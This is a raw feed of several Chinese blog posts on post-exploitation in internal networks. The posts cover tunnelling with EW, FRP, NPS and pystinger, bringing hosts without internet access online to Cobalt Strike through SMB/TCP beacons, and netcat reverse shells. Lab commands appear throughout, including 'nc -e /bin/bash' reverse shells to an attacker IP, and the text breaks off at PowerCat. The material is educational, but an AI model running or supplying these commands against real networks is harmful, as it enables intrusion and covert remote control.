class="hljs-number">4444</span><br></code></pre></td></tr></table></figure><p>黑客使用工具连接web服务器的1080端口从而实现访问内网机器</p><h4 id="实验步骤-2"><a href="#实验步骤-2" class="headerlink" title="实验步骤"></a>实验步骤</h4><p>1、在内网的机器B上执行命令</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ew</span> -s ssocksd -l <span class="hljs-number">4444</span><br></code></pre></td></tr></table></figure><p><img src="/img/image-20231101171818277.png" alt="image-20231101171818277"> </p><p>2、在web机器上执行如下命令</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ew</span> -s lcx_tran -l <span class="hljs-number">1080</span> -f BIP -g <span class="hljs-number">4444</span><br></code></pre></td></tr></table></figure><p><img src="/img/image-20231101171809205.png" alt="image-20231101171809205"> </p><p>3、测试代理</p><p><img src="/img/image-20231101171751567.png" alt="image-20231101171751567"> </p><h3 id="4-（二级代理）反向连接"><a href="#4-（二级代理）反向连接" class="headerlink" title="4.（二级代理）反向连接"></a>4.（二级代理）反向连接</h3><p>反向代理的拓扑路线如下</p><p><img src="/img/image-20231101172452482.png" alt="image-20231101172452482"></p><p>1、web服务器在内网可以访问VPS</p><p>2、内网机器B在内网不能访问VPS可以访问web服务</p><p><img src="/img/image-20231101173124349.png" alt="image-20231101173124349"></p><p>vps</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ew</span> -s lcx_listen -l <span class="hljs-number">1080</span> -e <span class="hljs-number">4444</span><br></code></pre></td></tr></table></figure><p>主机B</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ew</span> -s ssocksd -l <span class="hljs-number">5555</span><br></code></pre></td></tr></table></figure><p>web服务器</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ew</span> -s lcx_slave -d vps_IP -e <span class="hljs-number">4444</span> -f hostB_IP -g <span class="hljs-number">5555</span><br></code></pre></td></tr></table></figure><p>黑客代理到vps1080端口</p><h2 id="FPR介绍和使用（稳定）"><a href="#FPR介绍和使用（稳定）" class="headerlink" title="FPR介绍和使用（稳定）"></a>FPR介绍和使用（稳定）</h2><h3 id="FRP介绍（0-51-2版本的使用，最新参考使用手册）"><a href="#FRP介绍（0-51-2版本的使用，最新参考使用手册）" class="headerlink" title="FRP介绍（0.51.2版本的使用，最新参考使用手册）"></a>FRP介绍（0.51.2版本的使用，最新参考使用手册）</h3><p>FRP (Fast Reverse Proxy) 是一个使用 Go 语言开发的高性能的反向代理应用，可以轻松地进行内网穿 透，对外网提供服务。FRP 支持 TCP、UDP、HTTP、HTTPS等协议类型，他支持点对点的转发，还有 全流量转发，FRP最大的一个特点是使用SOCKS代理，而SOCKS是加密通信的，类似于做了一个加密的 隧道，可以把外网的流量，通过加密隧道穿透到内网。效果有些类似于VPN。</p><p>下载地址：<a href="https://github.com/fatedier/frp/releases">https://github.com/fatedier/frp/releases</a></p><p>使用手册：<a href="https://gofrp.org/zh-cn/docs/">https://gofrp.org/zh-cn/docs/</a></p><p>FRP分为两个文件 </p><p>将 frps 及 frps.ini 放到具有公网 IP 的机器上。 将 frpc 及 frpc.ini 放到处于内网环境的机器上。</p><h3 id="FRP启动"><a href="#FRP启动" class="headerlink" title="FRP启动"></a>FRP启动</h3><h4 id="服务端配置"><a href="#服务端配置" class="headerlink" title="服务端配置"></a>服务端配置</h4><p>Frp 默认给出两个服务端配置文件，一个是简版的 frps.ini，另一个是完整版本 frps_full.ini，服务端一 般就是搭建在公网的机器上（黑客的机器）</p><p>代理配置文件</p><img src="/img/image-20231102204519444.png" alt="image-20231102204519444" style="zoom:80%;" /> <p>代理启动文件</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">.<span class="hljs-regexp">/frps -c ./</span>frps.ini<br></code></pre></td></tr></table></figure><p>使用FRPS 运行 frps.ini 配置文件</p><h4 id="客户端配置"><a href="#客户端配置" class="headerlink" title="客户端配置"></a>客户端配置</h4><p>FRP 默认也给出两个客户端配置文件，一个是简版的 frpc.ini，另一个是完整版本 frpc_full.ini。 这里同 样以简版的 frpc.ini 文件为例，假设 FRP 服务端所在服务器的公网 IP 为 X.X.X.X：</p><p>配置文件如下</p><img src="/img/image-20231102204551285.png" alt="image-20231102204551285" style="zoom:80%;" />  <p>启动文件</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">.<span class="hljs-regexp">/frpc -c ./</span>frpc.ini<br></code></pre></td></tr></table></figure><p>配置文件非常重要，需要什么功能就可以进行不同的配置，来进行代理 参考文档：</p><p><a href="https://gofrp.org/zh-cn/docs/reference/">https://gofrp.org/zh-cn/docs/reference/</a></p><h3 id="1-点对点转发（P2P）"><a href="#1-点对点转发（P2P）" class="headerlink" title="1.点对点转发（P2P）"></a>1.点对点转发（P2P）</h3><p><img src="/img/image-20231102205549977.png" alt="image-20231102205549977"></p><p>内部网络无法直接访问该端口，可以通过FRP进行端口转发到公网</p><p>1、服务端配置如下</p><p><img src="/img/image-20231102210710367.png" alt="image-20231102210710367"> </p><p>启动服务端</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">.<span class="hljs-regexp">/frps -c ./</span>frps.ini<br></code></pre></td></tr></table></figure><p><img src="/img/image-20231102210825854.png" alt="image-20231102210825854"></p><p>2、客户端配置如下</p><p>连接服务端的7000端口，并将3389端口转发给服务端的6000端口</p><p><img src="/img/image-20231102211125334.png" alt="image-20231102211125334"> </p><p>启动客户端</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">frpc.exe -<span class="hljs-keyword">c</span> frpc.ini<br></code></pre></td></tr></table></figure><p><img src="/img/image-20231102211257942.png" alt="image-20231102211257942"> </p><p><img src="/img/image-20231102211313269.png" alt="image-20231102211313269"></p><p>访问vps的6000端口相当于连接内网机器的3389端口</p><p><img src="/img/image-20231102211421837.png" alt="image-20231102211421837"></p><p><img src="/img/image-20231102211554088.png" alt="image-20231102211554088"></p><h3 id="2-搭建socks代理"><a href="#2-搭建socks代理" class="headerlink" title="2.搭建socks代理"></a>2.搭建socks代理</h3><p>使用场景如下</p><p><img src="/img/image-20231111144301202.png" alt="image-20231111144301202"></p><p>现在我们搭建socks隧道实现对目标机器的全端口访问</p><p>服务端 配置文件：</p><img src="/img/image-20231111144352990.png" alt="image-20231111144352990" style="zoom:80%;" /> <p><img src="/img/image-20231111144554227.png" alt="image-20231111144554227"></p><p>客户端配置文件：</p><img src="/img/image-20231111144230064.png" alt="image-20231111144230064" style="zoom:80%;" />  <p><img src="/img/image-20231111144720808.png" alt="image-20231111144720808"></p><p>配置socks代理即可 </p><img src="/img/image-20231111145006476.png" alt="image-20231111145006476" style="zoom:80%;" /> <h3 id="3-搭建socks多级隧道"><a href="#3-搭建socks多级隧道" class="headerlink" title="3.搭建socks多级隧道"></a>3.搭建socks多级隧道</h3><p>多级socks隧道搭建网络拓扑如下<img src="/img/image-20231111150408853.png" alt="image-20231111150408853"></p><p>代理配置：</p><p><img src="/img/image-20231111151612225.png" alt="image-20231111151612225"></p><p>首先搭建A-&gt;B的隧道 </p><p>A执行如下</p><img src="/img/image-20231111151630331.png" alt="image-20231111151630331" style="zoom:67%;" /> <p>B执行如下</p><img src="/img/image-20231111151644274.png" alt="image-20231111151644274" style="zoom:67%;" /> <p>搭建好隧道之后接着使用端口转发 </p><p>B上执行如下</p><img src="/img/image-20231111151704874.png" alt="image-20231111151704874" style="zoom:67%;" /> <p>VPS上执行如下</p><p><img src="/img/image-20231111151745090.png" alt="image-20231111151745090"> </p><p>通过工具连接</p><p><img src="/img/image-20231111151928835.png" alt="image-20231111151928835"></p><h2 id="NPS的介绍和使用"><a href="#NPS的介绍和使用" class="headerlink" title="NPS的介绍和使用"></a>NPS的介绍和使用</h2><h3 id="NPS介绍"><a href="#NPS介绍" class="headerlink" title="NPS介绍"></a>NPS介绍</h3><p>nps是一款轻量级、高性能、功能强大的内网穿透代理服务器。目前支持tcp、udp流量转发，可支持任何tcp、udp上层协议（访问内网网站、本地支付接口调试、ssh访问、远程桌面，内网dns解析等等……），此外还支持内网http代理、内网socks5代理、p2p等，并带有功能强大的web管理端。</p><p>使用手册：<a href="https://ehang-io.github.io/nps/#/">https://ehang-io.github.io/nps/#/</a> </p><p>下载地址：<a href="https://github.com/ehang-io/nps/releases">https://github.com/ehang-io/nps/releases</a> </p><p>NPS也分为客户端和服务端两个 </p><p>客户端：运行在内网中 </p><p>服务端：运行在公网上</p><h3 id="NPS使用"><a href="#NPS使用" class="headerlink" title="NPS使用"></a>NPS使用</h3><h4 id="服务端启用"><a href="#服务端启用" class="headerlink" title="服务端启用"></a>服务端启用</h4><p>运行nps.exe </p><p>账号：admin 密码：123 </p><p>需要 web 界面进行配置隧道</p><p><img src="/img/image-20231111154855788.png" alt="image-20231111154855788"></p><p><img src="/img/image-20231111155023160.png" alt="image-20231111155023160"></p><p><img src="/img/image-20231111155200826.png" alt="image-20231111155200826"></p><p><img src="/img/image-20231111155235034.png" alt="image-20231111155235034"></p><h4 id="客户端启用"><a href="#客户端启用" class="headerlink" title="客户端启用"></a>客户端启用</h4><p>在服务端的web界面进行配置后有命令显示</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">./npc.exe <span class="hljs-attribute">-server</span>=10.210.100.130:8024 <span class="hljs-attribute">-vkey</span>=1deb538o6gzkx9d7 <span class="hljs-attribute">-type</span>=tcp<br></code></pre></td></tr></table></figure><p><img src="/img/image-20231111155543457.png" alt="image-20231111155543457"></p><p>使用代理工具连接服务端的5000端口即可</p><p><img src="/img/image-20231111155757991.png" alt="image-20231111155757991"></p><h1 id="3-上线不出网机器方式"><a href="#3-上线不出网机器方式" class="headerlink" title="3.上线不出网机器方式"></a>3.上线不出网机器方式</h1><h2 id="不出网机器拓扑介绍"><a href="#不出网机器拓扑介绍" class="headerlink" title="不出网机器拓扑介绍"></a>不出网机器拓扑介绍</h2><h3 id="不出网机器介绍"><a href="#不出网机器介绍" class="headerlink" title="不出网机器介绍"></a>不出网机器介绍</h3><p>上线不出网机器是常见的问题，如何在内网中实现不出网机器的上线呢，分为了如下的形式，常见的网络拓扑如下</p><p><img src="/img/image-20231111162820321.png" alt="image-20231111162820321"></p><h3 id="情况分类"><a href="#情况分类" class="headerlink" title="情况分类"></a>情况分类</h3><p>上线不出网机器一般是指B区域的电脑上线到CS工具或者MSF上，因为B机器不出网无法和VPS进行通信</p><p>针对B区域不出网的机器一般是两种情况</p><p>1、纯内网环境，任何端口都不出网</p><p>2、只有特定的端口可以出网</p><p>针对A区域出网的机器也有如下的情况（中转机器或者是跳板机）</p><p>1、A区域的机器可以出网</p><p>2、A区域只有特定的端口可以出网</p><p>后续要用到端口复用技术和之前学习的代理技术</p><h2 id="CS工具自带上线不出网机器"><a href="#CS工具自带上线不出网机器" class="headerlink" title="CS工具自带上线不出网机器"></a>CS工具自带上线不出网机器</h2><p>存在一台中转机器，这台机器出网，这种是最常见的情况。经常是拿下一台边缘机器，其有多块网卡，内网机器都不出网。这种情况下拿这个边缘机器做中转，就可以上线。</p><p>网络拓扑图如下：</p><p>内网网卡：192.168.111.xxx</p><p>外网网卡：192.168.41.xxx</p><p><img src="/img/image-20231111165523183.png" alt="image-20231111165523183"></p><p><strong>A区域的机器已经被控制并且上线到CS,现在要将B区域的机器进行上线，有如下的形式</strong></p><h3 id="1-SMB-Beacon上线CS-不出网机器"><a href="#1-SMB-Beacon上线CS-不出网机器" class="headerlink" title="1.SMB-Beacon上线CS 不出网机器"></a>1.SMB-Beacon上线CS 不出网机器</h3><p>介绍：SMB Beacon使用命名管道通过父级Beacon进行通讯，当两个Beacons连接后，子Beacon从父Beacon获取到任务并发送。因为连接的Beacons使用Windows命名管道进行通信，此流量封装在SMB协议中，所以SMB Beacon相对隐蔽，绕防火墙时可能发挥奇效</p><p>通信网络拓扑如下：</p><p><img src="/img/image-20231111165629608.png" alt="image-20231111165629608"></p><p>实验步骤如下：</p><p>1、首先控制A区域的边界主机，使用CS</p><p><img src="/img/image-20231111165658628.png" alt="image-20231111165658628"></p><p>2、创建SMB监听器</p><p><img src="/img/image-20231111165712924.png" alt="image-20231111165712924"></p><p>3、创建SMB类型的木马</p><p><img src="/img/image-20231111165730109.png" alt="image-20231111165730109"></p><p>4、通过内网渗透技术（横向移动（IPC等）或者域内攻击）上传木马到B区域的机器</p><p><img src="/img/image-20231111165744205.png" alt="image-20231111165744205"></p><p>5、运行木马之后进行连接</p><p>用link 命令连接它或者unlink 命令断开它</p><p><img src="/img/image-20231111165831213.png" alt="image-20231111165831213"></p><h3 id="2-TCP-Beacon"><a href="#2-TCP-Beacon" class="headerlink" title="2. TCP Beacon"></a>2. TCP Beacon</h3><p>TCP Beacon和SMB Beacon类似只不过TCP Beacon不是使用SMB与父Beacon进行通信而是<strong>使用TCP socket</strong>进行通信，cs4.0之后，这个技术就不适合做第一个木马使用，因为他的<strong>流量都是明文的</strong>，容易被发现但是这个技术,很适合在内网穿透的时候去使用，在内网穿透的时候一般只能使用tcp beacon去生成木马。</p><p><img src="/img/image-20231111173322349.png" alt="image-20231111173322349"></p><p>实验步骤如下</p><p>1、首先控制A区域的边界主机，使用CS</p><p><img src="/img/image-20231111173339816.png" alt="image-20231111173339816"></p><p>2、创建TCP监听器</p><img src="/img/image-20231111173352698.png" alt="image-20231111173352698" style="zoom:67%;" /><p>3、创建TCP类型的木马</p><img src="/img/image-20231111173408727.png" alt="image-20231111173408727" style="zoom:67%;" /><p>4、上传木马之后进行连接 这里使用connect进行连接</p><p><img src="/img/image-20231111173427876.png" alt="image-20231111173427876"></p><h3 id="3-HTTP代理上线"><a href="#3-HTTP代理上线" class="headerlink" title="3.HTTP代理上线"></a>3.HTTP代理上线</h3><p>CS的监听器支持HTTP代理的配置，在配置监听器的时候可以添加HTTP代理，从而实现内网上线</p><img src="/img/image-20231111174552095.png" alt="image-20231111174552095" style="zoom: 67%;" />  <p>网络的拓扑图如下：</p><p><img src="/img/image-20231111174645693.png" alt="image-20231111174645693"></p><p>1、首先控制A区域的机器然后使用搭建HTTP隧道，HTTP隧道搭建可以使用webshell工具或者其他的工具，我们一般会借助哥斯拉或者冰蝎等webshell工具会自带该功能</p><p><img src="/img/image-20231111203722061.png" alt="image-20231111203722061"></p><p><strong>2、这里我们使用第三方的工具Goproxy工具可以简单的开启http隧道，支持各种形式（这个工具很牛逼啥都支持）</strong></p><p><strong>下载地址：</strong><a href="https://github.com/snail007/goproxy">https://github.com/snail007/goproxy</a></p><p>在跳板机上执行</p><p><img src="/img/image-20231111203912172.png" alt="image-20231111203912172"></p><p>3、配置代理，因为我们是在本地进行测试，他是正向连接的代理，不能用 VPS，我们采用本地的CS</p><p><strong>注意这里的http proxy填写的是内网网卡的地址（在第四步做了端口转发之后）</strong></p><p><img src="/img/image-20231111205217099.png" alt="image-20231111205217099"></p><p><strong>4、因为是双网卡，还需要做一个端口转发</strong></p><p>将内网网卡的8899端口转发到另一张网卡的8081端口</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">netsh<span class="hljs-built_in"> interface </span>portproxy <span class="hljs-built_in">add</span> v4tov4 <span class="hljs-attribute">listenaddress</span>=192.168.111.136 <span class="hljs-attribute">listenport</span>=8899 <span class="hljs-attribute">connectaddress</span>=192.168.41.218 <span class="hljs-attribute">connectport</span>=8081<br></code></pre></td></tr></table></figure><p><img src="/img/image-20231111205904885.png" alt="image-20231111205904885"></p><p>5、运行后就可以上线</p><p><img src="/img/image-20231111205922028.png" alt="image-20231111205922028"></p><h3 id="4-中转上线"><a href="#4-中转上线" class="headerlink" title="4.中转上线"></a>4.中转上线</h3><p>CS中自带一个中转上线的操作，就是使用端口转发的技术和socket通信</p><p><img src="/img/image-20231111210437649.png" alt="image-20231111210437649"></p><p>1、点击这个按钮然后填写相关的内容，一般都是不变的</p><img src="/img/image-20231111210455707.png" alt="image-20231111210455707" style="zoom:67%;" /><p>2、生成木马然后正常在机器上运行就可以了</p><p><img src="/img/image-20231111210535696.png" alt="image-20231111210535696"></p><h2 id="跳板机只有80端口出网如何上线CS"><a href="#跳板机只有80端口出网如何上线CS" class="headerlink" title="跳板机只有80端口出网如何上线CS"></a>跳板机只有80端口出网如何上线CS</h2><p>WEB机器不出网上线CS</p><h3 id="场景介绍"><a href="#场景介绍" class="headerlink" title="场景介绍"></a>场景介绍</h3><p>如果说当我们拿到一台电脑（一般是WEB机器）但是不出网。只有http端口可以连接，只有webshell的情况下，我们该如何将该机器上线到CS呢？</p><p><img src="/img/image-20231111210918853.png" alt="image-20231111210918853"></p><p>这个时候就要借助80端口，然后开启socks隧道，从而进行上线</p><h3 id="实验前提"><a href="#实验前提" class="headerlink" title="实验前提"></a>实验前提</h3><p>当前我们控制了一个WEB主机，可以使用工具连接</p><img src="/img/image-20231111211434360.png" alt="image-20231111211434360" style="zoom:67%;" /> <p>但是通过进一步的探测发现很多端口都不出网，被禁止了，上线CS也不行</p><p><img src="/img/image-20231111211459922.png" alt="image-20231111211459922"></p><h3 id="实验步骤-3"><a href="#实验步骤-3" class="headerlink" title="实验步骤"></a>实验步骤</h3><p>这个时候我们就要开启80端口的代理</p><p>1、我们是这里使用毒刺（pystinger）这个工具,毒刺是一款正向代理工具，通过webshell可以实现内网 socks4代理和端口映射，并且也可以直接上线MSF和CS</p><p>下载地址：<a href="https://github.com/FunnyWolf/pystinger/releases/tag/v1.6">https://github.com/FunnyWolf/pystinger/releases/tag/v1.6</a></p><p>2、将工具中的服务端工具传到服务器中</p><p><img src="/img/image-20231111211602005.png" alt="image-20231111211602005"></p><p>3、访问proxy页面查看一定要确保可以访问</p><p><img src="/img/image-20231111211616197.png" alt="image-20231111211616197"></p><p>4、在服务端运行开启命令</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh"><span class="hljs-literal">start</span> stinger_server.exe<br></code></pre></td></tr></table></figure><p><img src="/img/image-20231111211635793.png" alt="image-20231111211635793"></p><p>5、在VPS上运行连接命令</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">stinger_client</span>.exe -w http://<span class="hljs-number">192.168.41.218</span>/proxy.php -l <span class="hljs-number">127.0.0.1</span> -p <span class="hljs-number">60000</span><br></code></pre></td></tr></table></figure><p><img src="/img/image-20231111211659252.png" alt="image-20231111211659252"></p><p>6、开启CS监听器</p><img src="/img/image-20231111211743214.png" alt="image-20231111211743214" style="zoom: 67%;" /><p>7、生成木马然后运行上线CS</p><p><img src="/img/image-20231111211808811.png" alt="image-20231111211808811"></p><p>8、查看流量都是http的流量</p><p><img src="/img/image-20231111211825328.png" alt="image-20231111211825328"></p>]]></content>
    
    
    <categories>
      
      <category>内网隧道技术</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>内网隧道概述</title>
    <link href="/2023/11/27/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E6%A6%82%E8%BF%B0/"/>
    <url>/2023/11/27/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E6%A6%82%E8%BF%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="内网隧道概述"><a href="#内网隧道概述" class="headerlink" title="内网隧道概述"></a>内网隧道概述</h1><h2 id="隧道描述"><a href="#隧道描述" class="headerlink" title="隧道描述"></a>隧道描述</h2><p>攻击者通过边界主机进入内网，往往会利用它当跳板进行横向渗透，但现在的内部网络大多部署了很多安全设各，网络结构错综复杂，对于某些系统的访问会受到各种阻挠，这就需要借助代理去突破这些限制，因此面对不同的网络环境对于代理的选择及使用显得格外重要。</p><p><img src="/img/image-20231029154531500.png" alt="image-20231029154531500"></p><h2 id="隧道的分类"><a href="#隧道的分类" class="headerlink" title="隧道的分类"></a>隧道的分类</h2><p>关于隧道的分类大体可以从两个方面进行分类 </p><p>如果是从流量层分类 </p><p>1、应用层隧道（DNS SOCKS HTTP SSH） </p><p>2、传输层隧道（TCP隧道 UDP隧道） </p><p>3、网络层隧道（ICMP隧道 IPv6隧道）</p><p>如果从作用上来分类 </p><p>1、反弹SHELL（nc python bash） </p><p>2、端口转发（LCX SSH iptables telnet） </p><p>3、端口映射（LCX NPS FRP） </p><p>3、正向代理 (EW NPS FRP) </p><p>4、反向代理 (EW NPS FRP)</p><h2 id="重要概念"><a href="#重要概念" class="headerlink" title="重要概念"></a>重要概念</h2><h3 id="端口转发和端口映射"><a href="#端口转发和端口映射" class="headerlink" title="端口转发和端口映射"></a>端口转发和端口映射</h3><p>端口转发,有时被称为做隧道,是安全壳(SSH)为网络安全通信使用的一种方法简单来说,<strong>端口转发就是将一个端口收到的流量转发到另一个端口</strong>。</p><p>端口映射是 NAT的一种,功能是把在公网的地址转成私有地址。简单来说,<strong>端口映射就是将一个端口映射到另一个端口供其他人使用</strong></p><h3 id="Http代理和Socks代理（隧道）"><a href="#Http代理和Socks代理（隧道）" class="headerlink" title="Http代理和Socks代理（隧道）"></a>Http代理和Socks代理（隧道）</h3><p>Http代理用的是Http协议，工作在应用层，主要是用来代理浏览器访问网页。 </p><p>Socks代理用的是Socks协议，工作在会话层，主要用来传递数据包。socks代理又分为Socks4和 Sock5，Socks4只支持TCP，而Socks5支持TCP和UDP。</p><h3 id="反弹shell介绍"><a href="#反弹shell介绍" class="headerlink" title="反弹shell介绍"></a>反弹shell介绍</h3><p>反弹shell（reverse shell），就是控制端监听在某TCP&#x2F;UDP端口，<strong>被控端发起请求到该端口，并将其命令行的输入输出转到控制端</strong>。reverse shell与telnet，ssh等标准shell对应，本质上是网络概念的客户端与服务端的角色反转。</p><h3 id="正向代理和反向代理"><a href="#正向代理和反向代理" class="headerlink" title="正向代理和反向代理"></a>正向代理和反向代理</h3><p>正向是从攻击者电脑主动访问目标机器，例如通过主动访问目标建立Shell是正向Shell。</p><p>反向是从目标机器主动连接攻击者电脑，例如通过在目标机器执行操作访问攻击者电脑建立的Shell是反 向Shell</p>]]></content>
    
    
    <categories>
      
      <category>内网隧道技术</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>反弹shell基本方法和场景</title>
    <link href="/2023/11/27/%E5%8F%8D%E5%BC%B9shell%E5%9F%BA%E6%9C%AC%E6%96%B9%E6%B3%95%E5%92%8C%E5%9C%BA%E6%99%AF/"/>
    <url>/2023/11/27/%E5%8F%8D%E5%BC%B9shell%E5%9F%BA%E6%9C%AC%E6%96%B9%E6%B3%95%E5%92%8C%E5%9C%BA%E6%99%AF/</url>
    
    <content type="html"><![CDATA[<h1 id="反弹shell的方法和场景"><a href="#反弹shell的方法和场景" class="headerlink" title="反弹shell的方法和场景"></a>反弹shell的方法和场景</h1><h1 id="NC反弹shell"><a href="#NC反弹shell" class="headerlink" title="NC反弹shell"></a>NC反弹shell</h1><p>Netcat简称NC(除非自带，否则容易被杀),是一个简单、可靠的网络工具,被誉为网络界的瑞士军刀。通NC可以进行端口扫描、 反弹Shell、端口监听和文件传输等操作,常用参数如下：</p><img src="/img/image-20231031202326405.png" alt="image-20231031202326405" style="zoom:67%;" /> <h2 id="一、正向反弹Shell"><a href="#一、正向反弹Shell" class="headerlink" title="一、正向反弹Shell"></a>一、正向反弹Shell</h2><p>1、实验拓扑</p><p><img src="/img/image-20231031202702208.png" alt="image-20231031202702208"></p><p>攻击机：10.210.99.82</p><p>靶机： 10.210.100.147</p><p>2、实验介绍 </p><p>攻击者机器 10.210.99.82和靶机 10.210.100.147可以相互的访问，这个时候可以使用正向shell</p><p>3、实验复现 </p><p>1）在靶机上运行</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> -lvvp <span class="hljs-number">1111</span> -e C:\Windows\System32\cmd.exe windows机器<br><span class="hljs-attribute">nc</span> -lvvp <span class="hljs-number">1111</span> -e /bin/bash linux机器<br></code></pre></td></tr></table></figure><p><img src="/img/image-20231031203353556.png" alt="image-20231031203353556"> </p><p>2）在攻击机上运行</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> <span class="hljs-number">10.210.100.147</span> <span class="hljs-number">1111</span><br></code></pre></td></tr></table></figure><p>3）拿到正向的shell</p><img src="/img/image-20231031203520937.png" alt="image-20231031203520937" style="zoom:67%;" /> <h2 id="二、反向反弹Shell"><a href="#二、反向反弹Shell" class="headerlink" title="二、反向反弹Shell"></a>二、反向反弹Shell</h2><p>1、实验拓扑</p><p><img src="/img/image-20231031202702208.png" alt="image-20231031202702208"></p><p>攻击机：10.210.100.128<br>靶机：10.210.100.148</p><p>2、实验介绍 </p><p>攻击者机器10.210.100.128不能直接访问靶机，但是靶机10.210.100.148可以访问攻击者的机器，这个时候使用反向shell</p><p>3、实验复现</p><p>1）在攻击者机器运行</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> -lvvp <span class="hljs-number">1111</span> 监听<span class="hljs-number">1111</span>端口<br></code></pre></td></tr></table></figure><p><img src="/img/image-20231031205325667.png" alt="image-20231031205325667"> </p><p>2）在靶机上运行 （反弹到公网）</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> -e C:\Windows\System32\cmd.exe <span class="hljs-number">192.168.3.27</span> <span class="hljs-number">1111</span> windos机器<br><span class="hljs-attribute">nc</span> -e /bin/bash <span class="hljs-number">192.168.3.27</span> <span class="hljs-number">1111</span> linux机器<br></code></pre></td></tr></table></figure><p>3）拿到反向的shell</p><img src="/img/image-20231031205615496.png" alt="image-20231031205615496" style="zoom:67%;" /> <h2 id="三、NC的其他用法"><a href="#三、NC的其他用法" class="headerlink" title="三、NC的其他用法"></a>三、NC的其他用法</h2><p>1、Banner 的抓取</p><p>靶机运行着ssh服务，可以查看服务的版本</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">nc</span> -nv <span class="hljs-built_in">IP</span> Port<br></code></pre></td></tr></table></figure><p><img src="/img/image-20231031211345520.png" alt="image-20231031211345520"></p><p>2、端口探测</p><p>可以查看端口的开放情况</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">nc</span> -v <span class="hljs-built_in">IP</span> Port<br></code></pre></td></tr></table></figure><p><img src="/img/image-20231031211437961.png" alt="image-20231031211437961"></p><p>多端口扫描：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> -v -z IP Port[<span class="hljs-number">1</span>]-Port[<span class="hljs-number">65535</span>]<br></code></pre></td></tr></table></figure><p>3、端口监听</p><p>监听端口，当访问该端口会输出该信息</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">nc -l -<span class="hljs-selector-tag">p</span> Port<br></code></pre></td></tr></table></figure><p>4、文件传输</p><figure class="highlight vhdl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs vhdl">接受端：nc -lp <span class="hljs-keyword">Port</span> &gt; <span class="hljs-keyword">file</span><br><br>发送端：nc -vn IP <span class="hljs-keyword">Port</span> &lt; <span class="hljs-keyword">file</span> -q <span class="hljs-number">1</span> (windows是-w，Linux是-q)<br></code></pre></td></tr></table></figure><p>1、 接收端文件夹下为空</p><p>2、 接收端执行命令</p><p><img src="/img/image-20231031212510631.png" alt="image-20231031212510631"> </p><p>3、 发送端执行命令</p><p><img src="/img/image-20231031212528176.png" alt="image-20231031212528176"></p><p>4、 接收端接收到文件</p><p><img src="/img/image-20231031212538265.png" alt="image-20231031212538265"> </p><p>5、简易聊天</p><p>1、vps执行 nc -l -p Port</p><p>2、靶机执行：nc -vn IP Port</p><p>6、连接远程主机 </p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm">命令 nc -nvv <span class="hljs-built_in">IP</span> port<br></code></pre></td></tr></table></figure><h1 id="PowerCat反弹Shell"><a href="#PowerCat反弹Shell" class="headerlink" title="PowerCat反弹Shell"></a>PowerCat反弹Shell</h1><h2 id="PowerCat介绍"><a href="#PowerCat介绍" class="headerlink" title="PowerCat介绍"></a>PowerCat介绍</h2><p>PowerCat是一个powershell写的tcp&#x2F;ip瑞士军刀，看一看成ncat的powershell的实现，然后里面也 加入了众多好用的功能，如文件上传，smb协议支持，中继模式，生成payload，端口扫描等等。</p><h2 